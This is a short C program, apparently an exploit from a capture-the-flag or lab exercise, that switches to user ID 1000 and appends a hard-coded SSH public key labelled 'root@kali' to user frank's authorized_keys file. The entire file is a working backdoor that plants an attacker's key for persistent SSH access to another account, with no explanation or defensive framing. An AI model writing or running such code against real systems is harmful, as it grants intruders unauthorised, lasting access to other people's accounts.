#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){
    setuid(1000);

    FILE *fp = fopen ("/home/frank/.ssh/authorized_keys", "a");

 fprintf(fp, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDd8pdzDw0z7VHnPJOuD4juE7ZJe9hMRRjpf1wtl1EJuELElJuVlqtVgSjo4pCaXQ4t5FKA91SRVQOH/SZkBRe/UtVIV27Gl68CHogLl+jOd/spoMVgQk3HMSeua7iR5QxUKwxBgIcEun5bBPNT3tM+r66bbsuLurVZSuL2if2izphThB6vtPLa1dxZkbdtp0ZFcVMWVEcUzEJVcl2OrkO8w48BDC5Y/cZqf2Nz5ixVv14ap3er5tmk0RjT1o/9/pLqQW3ds1/VJTZLjO80fS0kSmysmkek755tg30AknrXQQsLxixd/krQrbNErbKPADpconAGjJDYstqCLhWN7wl5 root@kali");

 fclose(fp);
}
